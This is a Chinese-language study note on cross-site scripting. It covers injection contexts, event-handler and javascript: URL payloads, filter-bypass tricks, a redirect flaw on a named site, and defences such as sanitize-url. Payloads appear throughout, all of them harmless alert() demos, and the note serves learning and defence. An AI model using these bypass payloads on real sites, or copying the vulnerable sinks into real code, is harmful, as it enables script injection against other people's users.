## 了解
>XSS（Cross-site scripting） 就代表著攻击者可以在其他人的网站上面执行JavaScript 程序。
```php
<?php
 echo "Hello, " . $_GET['name'];
?>
```
如果访问的是 `index.php?name=<script>alert(1)</script>` 呢？输出的内容就会变成：Hello，`<script>alert(1)</script>`
`<script>`标签里的内容将被视为JavaScript代码来执行，屏幕上会弹出一个提示窗口，这意味着可以在其他人的网站中执行JavaScript代码。

```html
<div>
  Hello, <span id="name"></span>
</div>
<script>
  const qs = new URLSearchParams(window.location.search)
  const name = qs.get('name')
  document.querySelector('#name').innerHTML = name
</script>
```
通过`index.html?name=<script>alert(1)</script>`的方式可以插入任何我们想要的内容，但这次是通过前端使用`innerHTML`的方式将我们的 payload 添加到页面上。
两者之间的区别在于前面的例子实际上不会触发`alert`，原因是在使用`innerHTML`时，插入的`<script>`标签没有效果，因此攻击者必须调整XSS payload才能执行代码。


- localStorage :
- Cookie：`cookieStore` API / document.cookie /fetch()与其他api交互

## 执行js的方式
1. `<script>alert(1)</script>`
2. `Inline event handle` 在HTML元素中内联（内嵌）的事件处理程序
	1. `<img src="not_exist" onerror="alert(1)">`
	2. `<button onclick="alert(1)">拜託點我</button>`
	3. `<svg onload="alert(1)">`
	4. `<svg/onload=alert(1)>`  
		1. html属性中`"`非必要，没有空格就可以拿掉
		2. 标签跟属性间的空格可以用`/`替代
3. `<a href=javascript:void(0)>Link</a>`

### 常用的event handler
1. onerror
2. onload
3. onfocus
4. onblur
5. onanimationend
6. onclick
7. onmouseenter

## 常见情景

### 注入html
> 直接給你一塊空白的 HTML 讓你去操作，因此可以直接寫入任何想要的元素
```php
<?php
 echo "Hello, <h1>" . $_GET['name'] . '</h1>';
?>
```

```html
<div>
  Hello, <span id="name"></span>
</div>
<script>
  const qs = new URLSearchParams(window.location.search)
  const name = qs.get('name')
  document.querySelector('#name').innerHTML = name
</script>
```
`<script>alert(1)</script>`
#### 防御
>把使用者輸入中的 `<` 跟 `>` 全部取代掉，它就沒有辦法插入新的 HTML 標籤，就沒辦法做到任何事情。


### 注入属性
```html
<div id="content"></div>
<script>
  const qs = new URLSearchParams(window.location.search)
  const clazz = qs.get('clazz')
  document.querySelector('#content').innerHTML = `
    <div class="${clazz}">
      Demo
    </div>
  `
</script>
```
輸入的內容是做為某個屬性的值，被包在屬性裡面的：
我们可以使用`"<script>alert(1)</script>`来闭合标签，再插入js语句
```html
<div class=""><script>alert(1)</script>  
Demo  
</div>
```

#### `<>`被过滤
`" tabindex=1 onfocus="alert(1)" x="`
闭合`”`后使用event handler
```html
<div class="" tabindex=1 onfocus="alert(1)" x="">
  Demo
</div>
```

#### `' " `被过滤
>通过空格和`/`新增属性
```html
document.querySelector('#content').innerHTML = `
  <div class=${clazz}>
    Demo
  </div>
```
payload:
`/onclick=alert(1)`
```html
<div class=12 / onclick=alert(1)>
  Demo
</div>
```
### 注入javascript
```html
<script>
  const name = "<?php echo $_GET['name'] ?>";
  alert(name);
</script>
```

#### `"`过滤
`</script>` 闭合标签，再注入其他标签

#### ``<>"'`过滤
如果在輸入裡面加一個空行，就會因為換行導致整段程式碼無法執行，出現 `SyntaxError`

```html
<script>
  const name = `
    Hello,
    <?php echo $_GET['name'] ?>
  `;
  alert(name);
</script>
```
此时可以用`${alert(1)}` 的方式來注入 JavaScript 程式

## Javascript伪协议

### where
1. href:  `<a href=javascript:alert(1)>Link</a>`  
2. iframe: `<iframe src=javascript:alert(1)></iframe>` 
3. form的action
```html
<form action=javascript:alert(1)>  
<button>submit</button>  
</form>
```
5. button的formaction
```html
<form id=f2>  
</form>  
<button form=f2 formaction=javascript:alert(2)>submit</button>
```


#### 例子1:插入youtube视频
如果網站上有個功能可以讓使用者在發文時填入 YouTube 影片網址，並且在文章中自動嵌入
```html
<iframe src="<?= $youtube_url ?>" width="500" height="300">
</iframe>
```
1. `javascript:alert(1);`
2. 绕过对youtube.com的检查：`javascript:alert(1);console.log('youtube.com')`
3. 防御：正確方式是檢查網址是否為 YouTube 影片的格式，並且要確保網址是以 `https://` 開頭

#### 例子2:profile 頁面填入自己的 blog
![](media/Pasted%20image%2020231025155828.png)
后端代码
```php
<a href="<?php echo htmlspecialchars($data) ?>">link</a>`
```
儘管把 `<>";` 都做了編碼，沒辦法新增標籤，也沒辦法跳脫雙引號新增屬性，但攻擊者依舊可以插入 `javascript:alert(1)`，因為這裡面完全沒有任何不合法的字元。

#### React
現在的前端框架基本上都會自動幫你做好跳脫，沒有在 React 裡面使用 `dangerouslySetInnerHTML` 或是在 Vue 裡面使用 `v-html` 的話，基本上都是沒什麼問題的，但是 `href` 就不同了，理由同上，它的內容是沒問題的。

```react
import React from 'react';

export function App(props) {
  // 假設底下的資料是來自於使用者
  const href = 'javascript:alert(1)'
  return (
    <a href={href}>click me</a>
  );
}
```
\ React 在 v16.9 的時候有針對這個行為新增警告，在文件裡面也有說明：[Deprecating javascript: URLs](https://legacy.reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls)，警告的內容是：

> Warning: A future version of React will block javascript: URLs as a security precaution. Use event handlers instead if you can. If you need to generate unsafe HTML try using dangerouslySetInnerHTML instead.

在 React GitHub 的 issue 裡面也有更多的討論：

1. [React@16.9 block javascript:void(0); #16592](https://github.com/facebook/react/issues/16592)
2. [False-positive security precaution warning (javascript: URLs) #16382](https://github.com/facebook/react/issues/16382)
#### Vue
```vue
<script setup>
import { ref } from 'vue'

const link = ref('javascript:alert(1)')
</script>

<template>
  <a :href="link">click me</a>
</template>
```
 [URL Injection](https://vuejs.org/guide/best-practices/security.html#potential-dangers)
 
如果要在前端處理的話，有提到可以用 [sanitize-url](https://github.com/braintree/sanitize-url) 這一套 library。

### 页面跳转
```html
const searchParams = new URLSearchParams(location.search)
window.location = searchParams.get('redirect')
```
payload:
```
window.location = 'javascript:alert(document.domain)'
```

#### 例子：
![](media/Pasted%20image%2020231025161411.png)
点击登录后会调用`redirectToTarget` 的 function：
```Javascript
/**
 * Redirect to "?target=" or fallback URL with page reload.
 *
 * (works on CSR)
 */
export const redirectToTarget = ({
  fallback = 'current',
}: {
  fallback?: 'homepage' | 'current'
} = {}) => {
  const fallbackTarget =
    fallback === 'homepage'
      ? `/` // FIXME: to purge cache
      : window.location.href
  const target = getTarget() || fallbackTarget

  window.location.href = decodeURIComponent(target)
}
```
在拿到 target 之後直接使用了：`window.location.href = decodeURIComponent(target)` 來做重新導向。而 `getTarget` 其實就是去 query string 把 target 的值拿出來。所以如果登入的網址是：`https://matters.news/login?target=javascript:alert(1)`，在使用者按下登入並且成功之後，就會跳出一個 alert，觸發 XSS！
<img src="/cgi-bin/viewfile?f=A3BC79E8D78093139F96EB2783A5C9DB278ED108D21D84811D2817DAADA1D164B3B39DCC743FFF75ED64557B9E11ED9914776FD598F73B2574728B56D57C62AFE8F9AAE70A35F14A1973ED2823D058EBA57DE74CD39E0E74E3D3E2333D9B380A&amp;mailid=ZL0025_9SXNMleMKhYuHWUAtpqo5da&amp;sid=2wtKIEWdz-PLH2cC&amp;net=2643209758" style="width: 868px; height: 867px;" id="img_insert_1698225072867002176392159620466" modifysize="92%" diffpixels="22px" scalingmode="zoom">
### `javascript`过滤
HTML 裡面的屬性內容是可以經過編碼的
`<a href="&#106avascript&colon;alert(1)">click me</a>`

### 防御
1. 使用[sanitize-url](https://github.com/braintree/sanitize-url)
2. 

## 参考链接
1. https://web.archive.org/web/20100723152801/http://blogs.msdn.com/b/dross/archive/2009/12/15/happy-10th-birthday-cross-site-scripting.aspx
2. https://owasp.org/www-pdf-archive/OWASP-AppSecEU08-Dabirsiaghi.pdf
3. https://github.com/mandatoryprogrammer/xsshunter-express
4. https://hackerone.com/reports/948929
5. [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)